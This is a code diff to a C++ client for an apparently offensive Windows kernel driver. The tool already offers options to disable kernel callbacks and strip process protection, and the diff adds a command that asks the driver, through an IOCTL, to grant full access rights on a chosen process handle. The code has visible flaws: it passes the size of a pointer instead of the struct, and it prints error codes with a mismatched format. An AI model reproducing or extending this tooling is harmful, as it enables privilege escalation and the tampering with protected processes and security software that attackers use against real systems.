@@ -36,7 +36,8 @@ int main(int argc, char * argv[])
 			"5: (RING 0) DISABLE CALLBACK <PVOID:address>\n\t"
 			"6: (RING 0) REMOVE_PS_PROTECTION FROM <int:PID>\n\t"
 			"7: (RING 3) LIST KERNEL OBJECTS OF <int:PID>\n\t"
-			"8: (RING 3) LIST KERNEL MODULES\n\t"
+			"8: (RING 0) SET FULL PRIVS ON <int:PID> <hex:handleID>\n\t"
+			"9: (RING 3) LIST KERNEL MODULES\n\t"
 		);
 		return 1;
 	}
@@ -169,7 +170,30 @@ int main(int argc, char * argv[])
 			listAllKernelObjectsViaHandles(atoi(argv[2]));
 			break;
 		}
-		case 8: //CHECK LOADED KERNEL MODULES FROM USERLAND
+		case 8: //SET FULL PRIVS ON KERNEL OBJECT
+		{
+			if (argc < 4)
+			{
+				printf("[-] address of kernel object to be modified required");
+				exit(1);
+			}
+
+			int pid = std::atoi(argv[2]);
+			int handleID = std::stoi(argv[3], 0, 16);
+
+			PTARGET_HANDLE handle = new TARGET_HANDLE{ pid, handleID };
+
+			if (success = DeviceIoControl(hDriver, IOCTL_SET_FULL_PRIVS_ON_KERNEL_OBJECT, handle, sizeof(handle), nullptr, 0, nullptr, nullptr))
+			{
+				printf("[+] Assigned full privs to handle 0x%x\n", handleID);
+			}
+			else
+			{
+				printf("[-] error: 0x%d\n", GetLastError());
+			}
+			break;
+		}
+		case 9: //CHECK LOADED KERNEL MODULES FROM USERLAND
 		{
 			listAllKernelDrivers();
 			break;
